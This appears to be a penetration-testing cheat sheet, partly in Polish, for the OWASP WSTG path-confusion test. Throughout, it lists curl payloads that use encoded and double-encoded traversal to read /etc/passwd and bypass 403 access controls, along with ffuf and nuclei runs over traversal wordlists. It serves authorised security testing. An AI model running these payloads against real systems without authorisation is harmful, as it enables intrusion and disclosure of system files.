# WSTG-CONF-13 — Test Path Confusion

## Cele

- Make sure application paths are configured correctly
- Test URL normalization and path traversal variants
- Identify path confusion vulnerabilities that bypass security controls

## KOMENDY

### Testowanie path traversal

```bash
curl -s https://TARGET/..%2f..%2fetc/passwd | head -5
curl -s https://TARGET/..;/admin | head -5
curl -s https://TARGET/..%252f..%252f | head -5
curl -s "https://TARGET/static/..;/admin" | head -5

```

### URL normalization tests

```bash
curl -sI https://TARGET/admin | head -1
curl -sI https://TARGET//admin | head -1
curl -sI https://TARGET/./admin | head -1
curl -sI https://TARGET/admin/ | head -1
curl -sI https://TARGET/admin/. | head -1
curl -sI https://TARGET/ADMIN | head -1
curl -sI https://TARGET/Admin | head -1
curl -sI "https://TARGET/admin%20" | head -1
curl -sI "https://TARGET/admin%00" | head -1

```

### Path traversal z podwojnym kodowaniem

```bash
curl -s "https://TARGET/%2e%2e/%2e%2e/etc/passwd" | head -5
curl -s "https://TARGET/%252e%252e/%252e%252e/etc/passwd" | head -5
curl -s "https://TARGET/..%c0%af..%c0%af/etc/passwd" | head -5
curl -s "https://TARGET/..%ef%bc%8f..%ef%bc%8f/etc/passwd" | head -5

```

### Bypass filtra sciezek

```bash
curl -sI "https://TARGET/admin..;/" | head -1
curl -sI "https://TARGET/admin;foo=bar" | head -1
curl -sI "https://TARGET/admin%23" | head -1
curl -sI "https://TARGET/admin%3f" | head -1

```

### Testowanie z roznym trailing

```bash
curl -sI https://TARGET/admin | head -1
curl -sI https://TARGET/admin/ | head -1
curl -sI https://TARGET/admin// | head -1
curl -sI https://TARGET/admin/./ | head -1
curl -sI https://TARGET/admin/..;/ | head -1

```

### Reverse proxy path confusion

```bash
curl -sI "https://TARGET/public/..;/admin" | head -1
curl -sI "https://TARGET/public/%2e%2e/admin" | head -1
curl -sI "https://TARGET/api/..;/admin" | head -1

```

### Nuclei - path confusion/traversal

```bash
nuclei -u https://TARGET -tags lfi -o output_nuclei_lfi.txt
nuclei -u https://TARGET -tags traversal -o output_nuclei_traversal.txt

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings - Directory Traversal payloads

```bash
ffuf -u "https://TARGET/FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/Directory Traversal/Intruder/directory_traversal.txt" -mc 200 -o output_ffuf_traversal.json

ffuf -u "https://TARGET/FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/Directory Traversal/Intruder/deep_traversal.txt" -mc 200 -o output_ffuf_deep_traversal.json

ffuf -u "https://TARGET/FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/Directory Traversal/Intruder/dotdotpwn.txt" -mc 200 -o output_ffuf_dotdotpwn.json

ffuf -u "https://TARGET/FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/Directory Traversal/Intruder/traversals-8-deep-exotic-encoding.txt" -mc 200 -o output_ffuf_exotic_encoding.json

```

### Bug-Bounty-Wordlists 403 bypass payloads

```bash
ffuf -u "https://TARGET/adminFUZZ" -w Desktop/WSTG/Bug-Bounty-Wordlists-main/403_url_payloads.txt -mc 200 -o output_ffuf_403_bypass.json

```

### Bug-Bounty-Wordlists 403 header payloads

```bash
# Uzyj kazda linie jako naglowek do bypass
ffuf -u https://TARGET/admin -H "FUZZ" -w Desktop/WSTG/Bug-Bounty-Wordlists-main/403_header_payloads.txt -mc 200 -o output_ffuf_403_header_bypass.json

```

### SecLists reverse proxy inconsistencies

```bash
ffuf -u "https://TARGET/FUZZ" -w Desktop/WSTG/SecLists-master/Discovery/Web-Content/reverse-proxy-inconsistencies.txt -mc 200 -o output_ffuf_reverse_proxy.json

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Przetestuj rozne warianty sciezek w Burp Repeater (..;/, %2e%2e, podwojne kodowanie)
2. Sprawdz roznice w zachowaniu frontendu i backendu (reverse proxy confusion)
3. Testuj case sensitivity sciezek (Admin vs admin vs ADMIN)
4. Sprawdz czy trailing slash zmienia zachowanie (/admin vs /admin/)
5. Testuj null byte i inne specjalne znaki w sciezkach
6. Sprawdz czy mozna ominac kontrole dostepu przez path manipulation
7. Przetestuj path traversal do odczytu plikow systemowych
8. Zweryfikuj czy normalizacja URL jest spójna miedzy komponentami


---

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| Additional CORS Checks | Testowanie blednych konfiguracji CORS | [GitHub](https://github.com/ybieri/Additional_CORS_Checks) |
